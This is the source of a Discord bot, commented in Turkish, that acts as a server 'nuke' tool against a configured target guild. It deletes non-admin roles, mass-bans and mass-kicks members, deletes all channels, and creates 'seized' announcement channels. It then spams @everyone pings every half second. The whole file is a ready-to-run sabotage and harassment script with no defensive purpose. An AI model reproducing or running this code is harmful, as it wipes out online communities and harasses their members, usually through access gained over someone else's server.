const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
const fs = require('fs');

const ayarlar = JSON.parse(fs.readFileSync('./ayarlar.json', 'utf8'));
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent 
  ]
});

client.once('ready', async () => {
  console.log(`${client.user.tag} tahribat aktif.`);

  const guild = client.guilds.cache.get(ayarlar.sunucu_id);
  if (!guild) {
    console.log("Sunucu bulunamadı.");
    return process.exit();
  }

  console.log(`TARGET SERVER: ${guild.name}`);
  await guild.members.fetch();

  const oto = ayarlar.otomasyon;


  if (oto.rol_sil) {
    console.log("Rol silme işlemi başladı.");
    for (const role of guild.roles.cache.values()) {

      if (role.id === guild.id) continue;

      if (role.permissions.has(PermissionsBitField.Flags.Administrator)) {
        console.log(`Atlandı (admin rol): ${role.name}`);
        continue;
      }
      try {
        await role.delete("Otomasyon rol silme");
        console.log(`[✔] Silindi: ${role.name}`);
      } catch {
        console.log(`[✘] Silinemedi: ${role.name}`);
      }
    }
  }


  if (oto.banla) {
    console.log("Ban başlatıldı.");
    for (const member of guild.members.cache.values()) {
      if (!member.user.bot && member.bannable) {
        try {
          await member.ban({ reason: "Otomasyon ban" });
          console.log(`[✔] Banlandı: ${member.user.tag}`);
        } catch {
          console.log(`[✘] Banlanamadı: ${member.user.tag}`);
        }
      }
    }
  }


  if (oto.kickle) {
    console.log("Kick başlatıldı.");
    for (const member of guild.members.cache.values()) {
      if (!member.user.bot && member.kickable) {
        try {
          await member.kick("Otomasyon kick");
          console.log(`[✔ ] Atıldı: ${member.user.tag}`);
        } catch {
          console.log(`[✘ ] Atılamadı: ${member.user.tag}`);
        }
      }
    }
  }


  if (oto.kanal_sil) {
    console.log("Kanal silme işlemi başlatıldı.");
    for (const channel of guild.channels.cache.values()) {
      try {
        await channel.delete();
        console.log(`[✔ ] Silindi: ${channel.name}`);
      } catch {
        console.log(`[✘ ] Silinemedi: ${channel.name}`);
      }
    }
  }


  if (oto.el_konuldu_kanallari_olustur) {
    console.log("Yeni kanallar oluşturuluyor...");
    for (const mesaj of ayarlar.el_konuldu_mesajlari) {
      try {
        const ch = await guild.channels.create({
          name: mesaj.toLowerCase().replace(/ /g, '-').substring(0, 32),
          type: ChannelType.GuildText
        });
        await ch.send(mesaj);
        console.log(`[✔ ] Kanal: ${mesaj}`);
      } catch {
        console.log(`[✘ ] Kanal oluşturulamadı: ${mesaj}`);
      }
    }
  }


  if (oto.everyone_spam) {
    console.log("Everyone spam başlatıldı.");
    

    const textChannels = guild.channels.cache
      .filter(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.SendMessages))
      .first(3);

    if (textChannels.length === 0) {
      console.log("Mesaj atılacak kanal bulunamadı.");
      return;
    }

    setInterval(() => {
      for (const ch of textChannels) {
        ch.send(`@everyone ${ayarlar.everyone_message}`).catch(() => {
          console.log(`Mesaj atılamadı: ${ch.name}`);
        });
      }
    }, 500); // EVERYONE DELAY 0.5 1MS > 1000 2MS > 2000 ...
  } else {
    
    console.log("[✔ ] Tüm işlemler tamamlandı.");
    process.exit();
  }
});

client.login(ayarlar.token);
